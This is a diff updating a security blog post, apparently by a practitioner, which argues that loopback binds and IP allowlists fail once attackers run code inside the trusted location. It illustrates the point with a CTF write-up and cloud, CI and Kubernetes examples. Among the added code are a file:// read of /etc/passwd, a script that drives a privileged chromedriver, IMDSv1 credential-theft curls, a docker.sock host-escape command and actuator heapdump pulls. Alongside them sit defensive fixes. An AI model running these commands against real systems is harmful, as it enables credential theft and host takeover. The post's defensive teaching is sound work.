@@ -6,7 +6,7 @@
 <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; font-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self' mailto:; upgrade-insecure-requests">
 <meta name="referrer" content="strict-origin-when-cross-origin">
 <title>Your allowlist is inside the attacker · Usama Arshad</title>
-<meta name="description" content="Loopback allowlists, CI runners and metadata services all fail the same way: the control checks where a request came from, when the attacker.">
+<meta name="description" content="Loopback binds and IP allowlists fail the same way: they check where a request came from, when the attacker is already there. Anatomy, and.">
 <link rel="canonical" href="https://www.usamaarshad.me/blog/your-allowlist-is-inside-the-attacker-process/">
 <link rel="alternate" type="application/rss+xml" title="Usama Arshad, Writing" href="/feed.xml">
 <link rel="icon" href="/assets/favicon.ico">
@@ -15,21 +15,21 @@
 <meta property="og:type" content="article">
 <meta property="og:site_name" content="Usama Arshad">
 <meta property="og:title" content="Your allowlist is inside the attacker&#x27;s process">
-<meta property="og:description" content="Loopback allowlists, CI runners and metadata services all fail the same way: the control checks where a request came from, when the attacker.">
+<meta property="og:description" content="Loopback binds and IP allowlists fail the same way: they check where a request came from, when the attacker is already there. Anatomy, and.">
 <meta property="og:url" content="https://www.usamaarshad.me/blog/your-allowlist-is-inside-the-attacker-process/">
 <meta property="og:image" content="https://www.usamaarshad.me/assets/og.jpg">
 <meta property="article:published_time" content="2026-11-04">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:creator" content="@usama0x01">
 <meta name="twitter:title" content="Your allowlist is inside the attacker&#x27;s process">
-<meta name="twitter:description" content="Loopback allowlists, CI runners and metadata services all fail the same way: the control checks where a request came from, when the attacker.">
+<meta name="twitter:description" content="Loopback binds and IP allowlists fail the same way: they check where a request came from, when the attacker is already there. Anatomy, and.">
 <meta name="twitter:image" content="https://www.usamaarshad.me/assets/og.jpg">
 <script type="application/ld+json">
 {
   "@context": "https://schema.org",
   "@type": "BlogPosting",
   "headline": "Your allowlist is inside the attacker's process",
-  "description": "Loopback allowlists, CI runners and metadata services all fail the same way: the control checks where a request came from, when the attacker.",
+  "description": "Loopback binds and IP allowlists fail the same way: they check where a request came from, when the attacker is already there. Anatomy, and.",
   "datePublished": "2026-11-04",
   "dateModified": "2026-11-04",
   "author": {
@@ -81,7 +81,7 @@
         <div class="deck-copy" data-reveal style="--d:.08s">
           <p class="kicker">Writing</p>
           <h1 class="hero-title" id="pt">Your allowlist is inside the attacker&#x27;s process<span class="dot">.</span></h1>
-          <p class="deck">A CTF challenge taught me the cleanest statement of a bug class I keep finding in production: network-level allowlists that sit in front of a service the attacker is already executing inside.</p>
+          <p class="deck">A renderer that accepts attacker HTML, a chromedriver bound to loopback, and an IP allowlist that was true and useless at the same time. The anatomy of a control that checks location when it should check identity, and the four places it keeps costing people money.</p>
           <p class="wu-meta"><span class="cat">AppSec</span><span class="cat">Cloud</span><span class="cat">CI/CD</span><span class="cat">SSRF</span><span class="sep">·</span><span>4 November 2026</span></p>
         </div>
       </div>
@@ -90,9 +90,9 @@
   <section class="section">
     <div class="container">
       <div class="wu-layout">
-        <article class="wu" data-reveal><section id="the-shape-of-the-bug"><h2><span class="hn">01</span>The shape of the bug</h2>
-<p>There is a control pattern that looks like security and is not: <strong>restricting access to a privileged service by where the request appears to come from.</strong> Bind it to loopback. Allowlist an IP. Check that the source is inside the VPC. Ship it.</p>
-<p>It fails whenever the attacker gets to run code in the trusted location. And in modern architectures, the attacker gets to run code in the trusted location far more often than the design assumed.</p>
+        <article class="wu" data-reveal><section id="the-control-that-is-true-and-useless"><h2><span class="hn">01</span>The control that is true and useless</h2>
+<p>There is a security control that passes every review and stops nothing: <strong>restricting access to a privileged service by where the request appears to come from.</strong> Bind it to loopback. Allowlist an IP. Require the source to be inside the VPC. Tick the box.</p>
+<p>It holds exactly as long as the attacker cannot run code in the trusted location. In an architecture built from containers, sidecars, build runners and headless browsers, the attacker runs code in the trusted location constantly. That is what those components are <em>for</em>.</p>
 <figure class="meme"><div class="meme-card"><p class="meme-cap top">WE ONLY ACCEPT REQUESTS FROM 127.0.0.1</p><svg viewBox="0 0 560 200" role="img" xmlns="http://www.w3.org/2000/svg">
 <rect width="560" height="200" fill="#100e0d"/>
 <rect x="70" y="60" width="150" height="110" fill="none" stroke="#d6cfc3" stroke-width="1.5"/>
@@ -105,44 +105,117 @@
 <path d="M415 90v52M400 128l15 15 15-15" fill="none" stroke="#e5484d" stroke-width="1.6"/>
 <text x="415" y="188" fill="#e5484d" font-family="monospace" font-size="9" text-anchor="middle" letter-spacing="1">SOURCE IP: 127.0.0.1</text>
 </svg><p class="meme-cap bot">THE ATTACKER'S CODE IS RUNNING ON 127.0.0.1</p></div></figure>
-</section><section id="the-clean-example"><h2><span class="hn">02</span>The clean example</h2>
-<p>I hit the purest version of this in the BlackHat MEA 2026 qualifiers, in a challenge called <a href="/blog/blackhat-mea-2026-quals/deckforge/">DeckForge</a>. The service turns attacker-supplied HTML into preview images. Three decisions compose into a full compromise:</p>
-<ol class="steps">
-<li>The renderer runs Chromium with <code>--allow-file-access-from-files</code>, so the injected page gets an arbitrary local file read from a <code>file://</code> origin.</li>
-<li>It also runs with <code>--disable-web-security</code>, which removes the same-origin policy, so that page can issue arbitrary cross-origin requests and <em>read the responses</em>.</li>
-<li>A second chromedriver listens on loopback as a more privileged user, with <code>--allowed-origins='*'</code> and <code>--allowed-ips=127.0.0.1</code>.</li>
-</ol>
-<p>That last line is the one worth staring at. <code>--allowed-ips=127.0.0.1</code> is a real control, correctly implemented, doing exactly what it says. And it is worth nothing here, because the attacker's JavaScript is already executing on 127.0.0.1. The allowlist is checking a property the attacker inherited for free.</p>
-<p>File read alone was not enough; the flag path was randomised. The pivot to the privileged automation endpoint is what turned a read into a takeover. The IP check never stood a chance, because it was never guarding a boundary. It was guarding a location, and the attacker was handed that location by the architecture.</p>
-</section><section id="where-this-shows-up-for-real"><h2><span class="hn">03</span>Where this shows up for real</h2>
-<p>Once you have the shape, you see it everywhere. Four places it has cost real money:</p>
-<h3>Cloud instance metadata</h3>
-<p>The canonical case. <code>169.254.169.254</code> hands out credentials to anything that can reach it, on the theory that only the instance can. Then the instance runs an application with an SSRF bug, and "only the instance" starts including anyone on the internet who can make that application fetch a URL. IMDSv2 fixed this by requiring a token obtained via <code>PUT</code> with a hop limit, which is the right shape: prove you are the workload, do not merely originate from it.</p>
-<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">shell</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code># the classic, still working in too many places
+<p>What follows is the cleanest worked example I have run into, then the four production shapes it maps onto.</p>
+</section><section id="the-worked-example"><h2><span class="hn">02</span>The worked example</h2>
+<p>This comes from a challenge called DeckForge in the BlackHat MEA 2026 qualifiers. The service takes attacker-supplied HTML and renders it to a preview image, which is a completely normal thing for a slide builder to do. Three configuration decisions compose into a full compromise.</p>
+
+<h3>Decision one: the renderer can read the disk</h3>
+<p>Chromium is launched with <code>--allow-file-access-from-files</code>. That flag lets a page loaded from a <code>file://</code> origin read other local files. Attacker HTML, rendered from disk, now has an arbitrary local file read:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">html</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code><script>
+fetch('file:///etc/passwd')
+  .then(r => r.text())
+  .then(t => document.title = t);   // exfil via anything the service echoes back
+</script></code></pre></figure>
+<p>On its own this is already bad and already not enough, because the thing worth reading had a randomised filename. A read primitive with no path is a party trick.</p>
+
+<h3>Decision two: the renderer has no same-origin policy</h3>
+<p><code>--disable-web-security</code> removes SOP. The page can now issue cross-origin requests <em>and read the responses</em>, which is the half people forget. Without it you have blind SSRF from a browser; with it you have a full HTTP client that happens to live inside the victim's network namespace.</p>
+
+<h3>Decision three: something privileged is listening on loopback</h3>
+<p>A second chromedriver runs as a more privileged user, with:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">shell</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>chromedriver --allowed-origins='*' --allowed-ips=127.0.0.1 --port=9515</code></pre></figure>
+<p>Stare at the second flag. <code>--allowed-ips=127.0.0.1</code> is a real control, correctly implemented, doing precisely what it says. And it is worth nothing, because the attacker's JavaScript is already executing on 127.0.0.1. The allowlist is checking a property the attacker was handed for free by the architecture.</p>
+<p>So the renderer drives the privileged driver. WebDriver's wire protocol is plain JSON over HTTP:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">javascript</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>// running inside the attacker's rendered page, origin file://
+const drv = 'http://127.0.0.1:9515';
+
+// 1. open a session on the PRIVILEGED driver
+const s = await (await fetch(drv + '/session', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({capabilities: {alwaysMatch: {browserName: 'chrome'}}})
+})).json();
+
+const sid = s.value.sessionId;
+
+// 2. that browser runs as the privileged user, so its file:// reads
+//    land in a different, more interesting filesystem view
+await fetch(`${drv}/session/${sid}/url`, {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({url: 'file:///app/'})
+});
+
+// 3. read the rendered directory listing back out
+const src = await (await fetch(`${drv}/session/${sid}/source`)).json();</code></pre></figure>
+<p>The pivot is the whole exploit. The file read in the unprivileged renderer could not find the target; the privileged browser could, because it runs as a user who can see it. The IP allowlist never stood a chance, because it was never guarding a boundary. It was guarding a <em>location</em>, and the attacker had been invited into that location by design.</p>
+<p>The full challenge writeup, including the directory-listing pivot, is <a href="/blog/blackhat-mea-2026-quals/deckforge/">here</a>.</p>
+</section><section id="shape-one-cloud-instance-metadata"><h2><span class="hn">03</span>Shape one: cloud instance metadata</h2>
+<p>The canonical production version. <code>169.254.169.254</code> hands out IAM credentials to anything that can reach it, on the theory that only the instance can reach it. Then the instance runs an app with an SSRF bug, and "only the instance" starts including anybody on the internet who can make that app fetch a URL.</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">shell</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code># IMDSv1: reachable means authorised
 curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
-# IMDSv2: possession of a token, not position on the network
-TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token \
-  -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')</code></pre></figure>
+# -> role name, then:
+curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
+# -> AccessKeyId, SecretAccessKey, Token</code></pre></figure>
+<p>IMDSv2 is the correct fix and it is worth understanding <em>why</em> it works, because the pattern generalises. It does not add an allowlist. It requires the caller to prove something an SSRF cannot easily do:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">shell</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token \
+  -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')
 
-<h3>CI runners</h3>
-<p>A build runner is a machine that executes untrusted code by design; that is its entire job. Anything it can reach without credentials is reachable by whoever opened the pull request. Internal package registries that trust the build network, deployment APIs bound to the runner subnet, Docker sockets mounted for "convenience": all of them are allowlisting a location the attacker was invited into.</p>
-
-<h3>Sidecars and localhost admin ports</h3>
-<p>In a Kubernetes pod, containers share a network namespace. A debug endpoint bound to <code>127.0.0.1</code> in one container is reachable from every other container in that pod. Spring Boot Actuator's <code>/env</code> and <code>/heapdump</code> are the usual casualties: not exposed to the cluster, perfectly exposed to the sidecar that got popped.</p>
-
-<h3>Headless browsers and renderers</h3>
-<p>Any service that renders attacker-controlled content is a foothold on its own host. PDF generators, screenshot services, link unfurlers, preview thumbnailers. If that renderer has network access, treat it as an unauthenticated user agent sitting inside your trust boundary, because it is one.</p>
-</section><section id="how-to-actually-fix-it"><h2><span class="hn">04</span>How to actually fix it</h2>
-<p>The fix is always the same move: <strong>replace "where did this come from" with "what can you prove".</strong></p>
+curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ \
+  -H "X-aws-ec2-metadata-token: $TOKEN"</code></pre></figure>
+<p>Three properties do the work: it is a <code>PUT</code>, so simple request-forgery primitives that only issue <code>GET</code> cannot start the exchange; it requires a custom header, which most SSRF sinks cannot set; and the response hop limit defaults to 1, so the token does not survive a proxy. Possession of a token replaced position on a network.</p>
+<p>Enforce it rather than offering it. On AWS, <code>HttpTokens=required</code>:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">shell</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>aws ec2 modify-instance-metadata-options \
+  --instance-id i-0123456789abcdef0 \
+  --http-tokens required --http-put-response-hop-limit 1</code></pre></figure>
+</section><section id="shape-two-ci-runners"><h2><span class="hn">04</span>Shape two: CI runners</h2>
+<p>A build runner is a machine whose entire purpose is executing untrusted code. On a public repository, "untrusted" means anyone who can open a pull request.</p>
+<p>So everything the runner can reach without credentials is reachable by a stranger. Internal package registries that trust the build network. Deployment APIs allowlisted to the runner subnet. A Docker socket mounted for convenience, which is root on the host:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">yaml</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code># an invitation, not a convenience
+services:
+  ci:
+    volumes:
+      - /var/run/docker.sock:/var/run/docker.sock</code></pre></figure>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">shell</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code># what that mount is worth to anyone who can run a build step
+docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh</code></pre></figure>
+<p>The specific trap on GitHub Actions is <code>pull_request_target</code>, which runs with repository secrets available <em>and</em> in the context of the base repository. Combine it with a checkout of the PR head and attacker code executes with your secrets in scope. If you need that trigger, do not check out untrusted code in the same job.</p>
+</section><section id="shape-three-sidecars-and-localhost-admin-ports"><h2><span class="hn">05</span>Shape three: sidecars and localhost admin ports</h2>
+<p>In a Kubernetes pod, containers share a network namespace. "Bound to 127.0.0.1" means bound to every container in that pod, including the logging sidecar, the service-mesh proxy, and anything that gets compromised.</p>
+<p>Spring Boot Actuator is the usual casualty. Not exposed to the cluster, perfectly exposed to the sidecar:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">shell</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code># from any other container in the same pod
+curl -s http://127.0.0.1:8081/actuator/env | jq '.propertySources[].properties'
+curl -s http://127.0.0.1:8081/actuator/heapdump -o heap.bin   # credentials in memory</code></pre></figure>
+<p>The same applies to debug servers, pprof endpoints, Redis without a password, and every "it's only on localhost" decision in a containerised deployment. The blast radius of a loopback bind is the pod, not the process.</p>
+</section><section id="shape-four-anything-that-renders-attacker-content"><h2><span class="hn">06</span>Shape four: anything that renders attacker content</h2>
+<p>PDF generators, screenshot services, link unfurlers, preview thumbnailers, Office-document converters. Each one is a user agent you operate, pointed at content somebody else controls, running inside your trust boundary. Treat it as an unauthenticated user sitting in your network, because that is exactly what it is.</p>
+<p>The minimum viable containment:</p>
 <ul class="bullets">
-<li><strong>Authenticate the caller, not the interface.</strong> A loopback admin port still needs a credential. "Only local processes can reach it" is a statement about your network, not about your attacker.</li>
-<li><strong>Give renderers their own blast radius.</strong> No network egress, no loopback access to anything privileged, a dedicated unprivileged user, and a filesystem that contains nothing worth reading. Never <code>--disable-web-security</code> on a process that touches attacker input.</li>
-<li><strong>Make the trusted zone small enough to describe.</strong> If you cannot name every process that can reach a service, the allowlist protecting it is decorative.</li>
-<li><strong>Prefer proof of possession.</strong> Tokens, mTLS, signed requests, hop limits. All of them survive the attacker standing in the right place; an IP check does not.</li>
+<li><strong>No egress.</strong> Default-deny on the renderer's network policy, with an explicit allowlist if it genuinely needs to fetch remote images.</li>
+<li><strong>No loopback neighbours.</strong> Do not co-locate it with anything privileged. In Kubernetes that means its own pod, not a sidecar.</li>
+<li><strong>Never <code>--disable-web-security</code> or <code>--allow-file-access-from-files</code></strong> on a process that touches attacker input. If a feature needs them, that feature needs a different design.</li>
+<li><strong>A filesystem with nothing worth reading.</strong> Read-only root, dedicated unprivileged user, no mounted secrets, no service-account token.</li>
 </ul>
-<p>Network position used to be a decent proxy for identity, back when a machine ran one thing and the perimeter meant something. It has been a bad proxy for a decade, and every container, sidecar and build runner you add makes it worse. The allowlist is not wrong. It is answering a question nobody is asking.</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">yaml</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code># the shape that survives a renderer compromise
+spec:
+  automountServiceAccountToken: false
+  securityContext: { runAsNonRoot: true, runAsUser: 10001 }
+  containers:
+    - name: renderer
+      securityContext:
+        readOnlyRootFilesystem: true
+        allowPrivilegeEscalation: false
+        capabilities: { drop: ["ALL"] }</code></pre></figure>
+</section><section id="the-fix-stated-once"><h2><span class="hn">07</span>The fix, stated once</h2>
+<p>Every instance of this bug is repaired by the same move: <strong>replace "where did this come from" with "what can you prove".</strong></p>
+<ul class="bullets">
+<li><strong>Authenticate the caller, not the interface.</strong> A loopback admin port still needs a credential. "Only local processes can reach it" is a claim about your network, not about your attacker.</li>
+<li><strong>Prefer proof of possession.</strong> Tokens, mTLS, signed requests, hop limits. All of them survive the attacker standing in the right place. An IP check does not.</li>
+<li><strong>Make the trusted zone small enough to name.</strong> If you cannot list every process that can reach a service, the allowlist in front of it is decorative.</li>
+<li><strong>Assume every renderer, runner and sidecar is hostile</strong>, because each one executes input you do not control.</li>
+</ul>
+<p>Network position was a reasonable proxy for identity when one machine ran one thing and the perimeter meant something. It has been a bad proxy for a decade, and every container you add makes it worse. The allowlist is not wrong. It is answering a question nobody is asking.</p>
 </section></article>
-        <aside class="wu-rail"><h2>On this page</h2><ol><li><a href="#the-shape-of-the-bug">The shape of the bug</a></li><li><a href="#the-clean-example">The clean example</a></li><li><a href="#where-this-shows-up-for-real">Where this shows up for real</a></li><li><a href="#how-to-actually-fix-it">How to actually fix it</a></li></ol></aside>
+        <aside class="wu-rail"><h2>On this page</h2><ol><li><a href="#the-control-that-is-true-and-useless">The control that is true and useless</a></li><li><a href="#the-worked-example">The worked example</a></li><li><a href="#shape-one-cloud-instance-metadata">Shape one: cloud instance metadata</a></li><li><a href="#shape-two-ci-runners">Shape two: CI runners</a></li><li><a href="#shape-three-sidecars-and-localhost-admin-ports">Shape three: sidecars and localhost admin ports</a></li><li><a href="#shape-four-anything-that-renders-attacker-content">Shape four: anything that renders attacker content</a></li><li><a href="#the-fix-stated-once">The fix, stated once</a></li></ol></aside>
       </div>
     </div>
   </section>
